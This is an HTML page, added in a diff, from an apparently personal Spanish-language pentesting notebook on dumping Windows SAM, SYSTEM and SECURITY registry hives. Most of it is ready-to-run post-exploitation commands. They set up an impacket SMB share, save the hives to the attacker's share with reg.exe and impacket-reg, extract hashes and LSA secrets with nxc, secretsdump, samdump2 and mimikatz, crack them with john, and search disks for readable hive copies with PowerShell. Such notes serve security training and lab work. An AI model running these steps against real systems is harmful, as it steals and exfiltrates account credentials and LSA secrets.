@@ -1,0 +1,131 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>SAM, SYSTEM y SECURITY | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="sam-system-security">
+          <div class="note-tabbar">
+            <span>SAM, SYSTEM y SECURITY</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Windows/Dumping hashes</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / windows / dumping hashes</p>
+            <h2>SAM, SYSTEM y SECURITY</h2>
+
+            <p>SAM, SYSTEM y SECURITY son hives del registro usados para recuperar hashes locales y secretos LSA. Normalmente hacen falta privilegios de administrador o copias accesibles del sistema.</p>
+
+            <p><code>Hives locales del registro</code></p>
+            <p><span class="notebook-review-note">Aviso: Requiere <code>Admin</code> para extraer <code>SAM</code>, <code>SYSTEM</code> y <code>SECURITY</code></span></p>
+            <h2>Dumpear SAM/SYSTEM/SECURITY del DC</h2>
+            <p><code>SAM</code>/<code>SYSTEM</code></p>
+            <p><code>SAM</code>: almacena hashes de usuarios locales protegidos.</p>
+            <p><code>SYSTEM</code>: contiene la clave necesaria para descifrar los hashes de <code>SAM</code>.</p>
+            <p><code>SECURITY</code></p>
+            <p><code>SECURITY</code>: almacena <code>LSA Secrets</code>, como credenciales de servicios, autologon u otros secretos locales.</p>
+            <section class="code-card">
+              <h3>Extraer SAM/SYSTEM SECURITY</h3>
+              <pre><code># Kali: SMB Server 
+impacket-smbserver recurso $(pwd) -smb2support
+
+# Extraer Datos desde Kali
+impacket-reg &#x27;&lt;dominio&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;ip_dc&gt;&#x27; backup -o &#x27;\\&lt;kali_ip&gt;\recurso&#x27;
+# Alternativa: Extraer Datos desde Kali
+nxc smb &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;password&gt; --sam
+nxc smb &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;password&gt; --system
+nxc smb &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;password&gt; --security
+# Extraer Datos desde Windows
+reg.exe save hklm\sam &#x27;\\&lt;kali_ip&gt;\recurso\SAM.save&#x27;
+reg.exe save hklm\system &#x27;\\&lt;kali_ip&gt;\recurso\SYSTEM.save&#x27;
+reg.exe save hklm\security &#x27;\\&lt;kali_ip&gt;\recurso\SECURITY.save&#x27;</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Dumpear Registros</h3>
+              <pre><code># Dumpear SAM y SECURITY (LSA Secrets)
+impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
+# Dumpear SAM 
+impacket-secretsdump -sam SAM.save -system SYSTEM.save LOCAL
+samdump2 SAM.save SYSTEM.save -o sam.txt
+# Dumpear SAM con MimiKatz
+lsadump::sam SYSTEM SAM
+# Crackear Hash
+john --format=NT --wordlist=rockyou.txt sam.txt</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Otras posibles rutas de los registros</h3>
+              <pre><code>Get-ChildItem &quot;C:\&quot; -Recurse -File -Include SAM,SYSTEM -ErrorAction SilentlyContinue | Select-Object FullName
+Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.Name -in @(&quot;SAM&quot;,&quot;SYSTEM&quot;) } | Select-Object -ExpandProperty FullName
+
+C:\Windows\repair\SAM
+C:\Windows\System32\Config\SAM
+C:\Windows\System32\config\RegBack\SAM
+
+C:\Windows\repair\system
+C:\Windows\System32\Config\SYSTEM
+C:\Windows\System32\config\RegBack\SYSTEM</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Enumera SAM y SYSTEM y muestra si es dumpeable</h3>
+              <pre><code>Get-ChildItem C:\ -Recurse -Force -ErrorAction SilentlyContinue |
+Where-Object { $_.Name -in @(&quot;SAM&quot;,&quot;SYSTEM&quot;) } |
+ForEach-Object {
+    $canRead = $false
+    try {
+        $stream = [System.IO.File]::Open($_.FullName, &#x27;Open&#x27;, &#x27;Read&#x27;, &#x27;None&#x27;)
+        $stream.Close()
+        $canRead = $true
+    } catch {}
+    
+    [PSCustomObject]@{
+        Path = $_.FullName
+        Dumpable = $canRead
+    }
+}</code></pre>
+            </section>
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/windows-sam-system-security-dump.png" alt="Volcado de SAM, SYSTEM y SECURITY" />
+            </figure>
+            <p>Relacionado: <a href="/notebook/escalada-privilegios/windows/privilegios/backup.html">privilegio Backup</a>.</p>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>post_explotacion</span>
+              <span>dumping_hashes</span>
+              <span>sam</span>
+              <span>system</span>
+              <span>security</span>
+              <span>lsa_secrets</span>
+              <span>secretsdump</span>
+              <span>john</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
